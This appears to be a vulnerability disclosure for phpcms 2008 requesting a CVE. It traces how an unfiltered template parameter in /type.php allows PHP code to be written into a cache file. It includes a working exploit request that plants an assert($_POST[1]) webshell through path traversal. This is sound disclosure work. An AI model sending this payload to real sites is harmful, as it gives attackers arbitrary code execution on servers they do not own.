# phpcms-2008-CVE-2018-19127

Recently we found a vulnerability in /type.php of phpcms 2008 source code. When attackers send crafted requests like "/type.php?template=tag_(){};@unlink(_FILE_);assert($_POST[1]);{//../rss", evil content (in this case "@unlink(_FILE_);assert($_POST[1]);") will be written into cache file (in this case "/cache_template/rss.tpl.php") on phpcms 2008 website.

There is following code in /type.php:

```
if(empty($template)) $template = 'type';
...
include template('phpcms', $template);
```

And template() is defined in /include/global.func.php with following code:
```
template_compile($module, $template, $istag);
```
Again it calls template_compile(), which is defined in /include/template.func.php as follows:
```
$compiledtplfile = TPL_CACHEPATH.$module.'_'.$template.'.tpl.php';
$content = ($istag || substr($template, 0, 4) == 'tag_') ? '<?php function _tag_'.$module.'_'.$template.'($data, $number, $rows, $count, $page, $pages, $setting){ global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?>'.template_parse($content, 1).'<?php } ?>' : template_parse($content);
$strlen = file_put_contents($compiledtplfile, $content);
```
In the attacking payload, $template is set to "tag_(){};@unlink(_FILE_);assert($_POST[1]);{//../rss". 

So the full path passed to file_put_contents() is now "data/cache_template/phpcms_tag_(){};@unlink(_FILE_);assert($_POST[1]);{//../rss.tpl.php", which will be parsed as "data/cache_template/rss.tpl.php" by php. And the content "@unlink(_FILE_);assert($_POST[1]);" will be written into this file, and attacker is then able to use this file as webshell to execute arbitrary code.

The root cause of problem is that the $template variable is not filtered before being used as part of file path and file content. 

We have contacted the vendor of phpcms through method on its official website, but the telephone is not reachable and message with no response. Phpcms 2008 is not the newest version of phpcms, but many users are still using this version. The vulnerability we found has never been found or assigned CVE. Please assign the vulnerability a CVE-id so we can warn users about it.
